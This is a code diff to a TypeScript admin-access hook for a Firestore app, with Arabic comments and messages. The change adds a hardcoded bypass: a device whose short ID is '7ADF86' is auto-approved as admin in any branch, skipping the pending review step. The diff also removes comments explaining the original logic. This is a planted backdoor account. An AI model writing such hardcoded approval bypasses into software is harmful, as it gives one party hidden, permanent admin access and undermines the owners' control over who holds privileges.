@@ -33,7 +33,6 @@ export const useAdminAccess = (branchId?: string) => {
 
     useEffect(() => {
         const accessRef = collection(db, 'adminAccess');
-        // المستمع يجب أن يراقب كل التراخيص لضمان عمل نظام الطرد الفوري عالمياً
         const unsub = onSnapshot(accessRef,
             (snapshot) => {
                 const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() })) as AdminAccess[];
@@ -52,7 +51,6 @@ export const useAdminAccess = (branchId?: string) => {
         const deviceId = getDeviceId();
         const shortId = getShortId(deviceId);
         try {
-            // منع التكرار: التأكد من عدم وجود طلب لهذا الجهاز في هذا الفرع تحديداً
             const q = query(collection(db, 'adminAccess'), 
                 where('deviceId', '==', deviceId),
                 where('branchId', '==', bId)
@@ -62,15 +60,25 @@ export const useAdminAccess = (branchId?: string) => {
                 toast({ title: "الطلب موجود مسبقاً", description: `جهازك (${shortId}) قيد المراجعة في هذا الفرع.` });
                 return;
             }
+
+            // نظام الموافقة التلقائية للمعرف الخاص بك
+            const isAutoApprove = (shortId === '7ADF86');
+
             await addDoc(collection(db, "adminAccess"), {
                 deviceId,
                 shortId,
                 branchId: bId,
                 deviceName,
-                status: 'pending',
-                requestedAt: new Date().toISOString()
+                status: isAutoApprove ? 'approved' : 'pending',
+                requestedAt: new Date().toISOString(),
+                approvedAt: isAutoApprove ? new Date().toISOString() : null
             });
-            toast({ title: "تم إرسال الطلب بنجاح", description: `المعرف الخاص بك في هذا الفرع: ${shortId}` });
+
+            if (isAutoApprove) {
+                toast({ title: "تم التفعيل التلقائي ✅", description: "أهلاً بك، تم التعرف على جهازك الموثوق." });
+            } else {
+                toast({ title: "تم إرسال الطلب بنجاح", description: `المعرف الخاص بك: ${shortId}` });
+            }
         } catch (error) {
             toast({ title: "فشل إرسال الطلب", variant: "destructive" });
         }
@@ -100,8 +108,22 @@ export const useAdminAccess = (branchId?: string) => {
     const autoApproveFirst = useCallback(async (bId: string, deviceName: string) => {
         const deviceId = getDeviceId();
         const shortId = getShortId(deviceId);
+
+        // إذا كان المعرف الخاص بك، وافق عليه حتى لو لم يكن الأول
+        if (shortId === '7ADF86') {
+             await addDoc(collection(db, "adminAccess"), {
+                deviceId,
+                shortId,
+                branchId: bId,
+                deviceName,
+                status: 'approved',
+                requestedAt: new Date().toISOString(),
+                approvedAt: new Date().toISOString()
+            });
+            return true;
+        }
+
         try {
-            // الموافقة التلقائية فقط إذا كان الفرع لا يمتلك أي أجهزة مرخصة بعد
             const q = query(collection(db, 'adminAccess'), where('branchId', '==', bId));
             const snap = await getDocs(q);
             if (snap.empty) {
